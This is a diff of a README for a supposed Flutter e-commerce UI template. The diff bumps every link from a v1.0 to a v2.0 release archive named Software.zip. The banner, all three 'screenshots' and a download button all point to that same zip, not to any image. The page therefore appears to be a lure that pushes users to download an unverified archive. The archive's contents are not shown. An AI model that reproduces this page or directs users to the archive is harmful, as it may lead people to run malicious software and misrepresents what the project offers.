@@ -2,7 +2,7 @@
 
 ### A clean and modern Flutter UI template for building responsive e-commerce applications. Includes pre-designed screens such as Home, Product Listing, Cart, and more. Fully customizable and optimized for Android, iOS, and Web. Perfect for kickstarting your e-commerce app development.
 
-![E-commerce App](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)
+![E-commerce App](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -18,13 +18,13 @@
 ## Screenshots 📷
 
 ### Home Screen
-![Home Screen](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)
+![Home Screen](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)
 
 ### Product Listing
-![Product Listing](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)
+![Product Listing](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)
 
 ### Cart
-![Cart Screen](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)
+![Cart Screen](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -36,7 +36,7 @@
 
 ## Software Zip Download 📥
 
-[![Download Software](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)](https://github.com/Noveplacido/Complete-E-commerce-App-Flutter/releases/download/v2.0/Software.zip)
 
 ---
 
